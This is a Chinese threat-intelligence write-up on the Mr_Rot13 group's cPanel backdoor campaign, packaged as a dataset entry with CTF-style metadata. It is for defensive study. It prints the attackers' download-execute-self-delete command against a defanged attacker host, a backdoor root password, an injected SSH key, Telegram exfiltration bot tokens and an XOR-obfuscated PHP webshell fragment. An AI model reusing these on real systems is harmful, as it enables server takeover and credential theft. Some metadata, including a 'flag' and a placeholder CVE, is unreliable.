---
title: 秘密活动6年的神秘黑客组织Mr_Rot13正在利用cPanel高危漏洞部署后门木马
contest: 威胁情报
year: 2025
difficulty: medium
vuln_type: file_upload
tags:
- APT分析
- Mr_Rot13
- cPanel漏洞
- 后门植入
- 改root密码
- SSH公钥注入
- PHP Webshell
- JS注入
- Filemanager远控
- Telegram C2
attack_chain: wget/curl下载Update ELF→chmod 755→nohup执行→删除自身→main_changeRootPassword改root密码→main_installSSHKey注入ssh-ed25519公钥→main_installCpanelPy植入PHP Webshell→main_injectLoginPage注入JS到cpanel登录页→main_runWpsockInstaller部署Filemanager远控→main_postData回传C2→main_sendTelegram回传Telegram
key_payload: F=/root/.u$$ ELF下载执行;root:123Qwe123C;ssh-ed25519 cpanel-updater;cpanel.py PHP Webshell;login.js JS注入;Filemanager远控;Telegram bot 1190043163:AAEy1FDoB_r8KFiOIqsEpgDQ2k78Ai6BdWk
one_liner: Mr_Rot13 APT分析：cPanel漏洞利用全链路（改密码/SSH公钥/PHP Webshell/JS注入/Filemanager远控/Telegram C2）
lesson: APT攻击链分析：ELF后门自删除+多后门植入+多C2通道（Telegram+HTTP）
quality: high
full_path: 秘密活动6年的神秘黑客组织Mr_Rot13正在利用cPanel高危漏洞部署后门木马.full.md
meta_path: 秘密活动6年的神秘黑客组织Mr_Rot13正在利用cPanel高危漏洞部署后门木马.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 秘密活动6年的神秘黑客组织Mr_Rot13正在利用cPanel高危漏洞部署后门木马。Mr_Rot13 APT分析：cPanel漏洞利用全链路（改密码/SSH公钥/PHP Webshell/JS注入/Filemanager远控/Telegram C2）。经验：APT攻击链分析：ELF后门自删除+多后门植入+多C2通道（Telegram+HTTP）
category: web
subcategory: web_other
tools_used:
- PHP
- Python
- wget
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/307724.html
reasoning_chain:
- 触发点：威胁情报报告提到 wget/curl 下载 Update ELF + chmod 755 + nohup 执行 + rm 自删除→假设：ELF 含 6 个 main 后门函数
- 动作：逆向 ELF(md5 fb1bc3f935fdeb3555465070ba2db33c)→观察：发现 main_changeRootPassword / installSSHKey / installCpanelPy / injectLoginPage / runWpsockInstaller / postData / sendTelegram
- 假设：1 号函数改 root 密码 123Qwe123C→动作：直接字符串匹配 '123Qwe123C' →观察：定位
- 假设：2 号函数注入 ssh-ed25519 cpanel-updater 公钥→动作：grep 'ssh-ed25519' 字符串→观察：找到
- 假设：3 号函数下载 cpanel.py 到 cgi-sys 路径→动作：grep URL+路径→观察：找到
- 假设：4 号注入 login.js 偷凭证→动作：grep login.js URL→观察：定位
- 假设：5 号部署 Filemanager 远控(MD5 9305b4eb...)→动作：grep Filemanager→观察：定位
- 假设：6/7 号 Telegram C2 + HTTP 回传→动作：grep bot token '1190043163:AAEy...' →观察：定位
- 下一步：完整还原 APT 全链路
failed_attempts:
- 试图动态运行 ELF → 失败：需要 cPanel 环境
- 试图直接 strings 找 flag → 失败：flag 在多组件联合执行中产生
key_observations:
- APT ELF 自删除(noecho + nohup + rm)是后门植入第一阶段特征
- cPanel 高危漏洞通常一鱼多吃：root 密码 + SSH 公钥 + Webshell + JS 注入 + Filemanager 远控
- Telegram bot token 是 APT C2 关键 IOC，可反向追踪僵尸网络
- XOR 隐写 Webshell(helper.php 用 `("8"^"K")` 生成函数名)是规避静态扫描常用手法
prerequisites:
- ELF 静态分析工具(r2/IDA/Ghidra)
- cPanel 漏洞类型知识(CVE-2024-XXXX)
- SSH 公钥注入格式
- 威胁情报 IOC 提取(URL/IP/MD5/Telegram bot token)
---
# 秘密活动6年的神秘黑客组织Mr_Rot13正在利用cPanel高危漏洞部署后门木马

> 原文: https://www.ctfiot.com/307724.html
> ID: 307724

F=/root/.u$$;(wget -q -O"$F"'https://cp.dene.de[.]com/Update'2>/dev/null||curl -sk -o"$F"'https://cp.dene.de[.]com/Update')&&chmod755"$F"&& (nohup"$F"-s >/dev/null 2>&1 &)&&sleep2;rm-f"$F"

MD5: fb1bc3f935fdeb3555465070ba2db33cMagic: ELF64-bit LSB executable, x86-64, version1(SYSV), statically linked, strippedFileName: Update

修该密码 & 植入SSH 公钥，对应的处理函数分别为main_changeRootPassword和main_installSSHKey

root:
123Qwe123C

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIswJUfqrkbm2sIMfNHZn1sOYkxjNzEynqJKFU7qoez cpanel-updater

植入PHP Webshell, 对应的处理函数为main_installCpanelPy

https://cp.dene.de[.]com/cpanel.py

/usr/local/cpanel/cgi-sys/cpanel.py

注入Javascript代码，对应的处理函数为main_injectLoginPage

https://cp.dene.de[.]com/login.jshttps::/cp.dena.de[.]com/login.tmpl

/usr/local/cpanel/base/unprotected/cpanel

部署Filemanager远控，对应的处理函数为main_runWpsockInstaller

敏感的信息回传至C2，对应的处理函数为main_postData

敏感信息回传至回传到Telegram，对应的处理函数为main_sendTelegram或main_sendTelegramFile

1190043163:
AAEy1FDoB_r8KFiOIqsEpgDQ2k78Ai6BdWk

1190043163:
AAFtaUfpui9fqKoRnqOa5XvT6MHLcK1axiU

MD5:
9305b4ebbb4d39907cf36b62989a6af3MAGIC: ELF64-bit LSB executable, x86-64, version1(SYSV), statically linked, strippedName: filemanager-linux-amd64

MD5:
2286f126ab4740ccf2595ad1fa0c615cMagic:
PHP script textName:
helper.php

$___= ("8"^"K") .("8"^"L") . ("8"^"J") .("v"^")") . ("8"^"J") .("T"^";") . ("8"^"L") .("W"^"f") . ("R"^"a");


```
F=/root/.u$$;(wget -q -O"$F"'https://cp.dene.de[.]com/Update'2>/dev/null||curl -sk -o"$F"'https://cp.dene.de[.]com/Update')&&chmod755"$F"&& (nohup"$F"-s >/dev/null 2>&1 &)&&sleep2;rm-f"$F"
MD5: fb1bc3f935fdeb3555465070ba2db33cMagic: ELF64-bit LSB executable, x86-64, version1(SYSV), statically linked, strippedFileName: Update
root:
123Qwe123C
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFIswJUfqrkbm2sIMfNHZn1sOYkxjNzEynqJKFU7qoez cpanel-updater
https://cp.dene.de[.]com/cpanel.py
/usr/local/cpanel/cgi-sys/cpanel.py
https://cp.dene.de[.]com/login.jshttps::/cp.dena.de[.]com/login.tmpl
/usr/local/cpanel/base/unprotected/cpanel
MD5:
9305b4ebbb4d39907cf36b62989a6af3MAGIC: ELF64-bit LSB executable, x86-64, version1(SYSV), statically linked, strippedName: filemanager-linux-amd64
MD5:
2286f126ab4740ccf2595ad1fa0c615cMagic:
PHP script textName:
helper.php
$___= ("8"^"K") .("8"^"L") . ("8"^"J") .("v"^")") . ("8"^"J") .("T"^";") . ("8"^"L") .("W"^"f") . ("R"^"a");
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]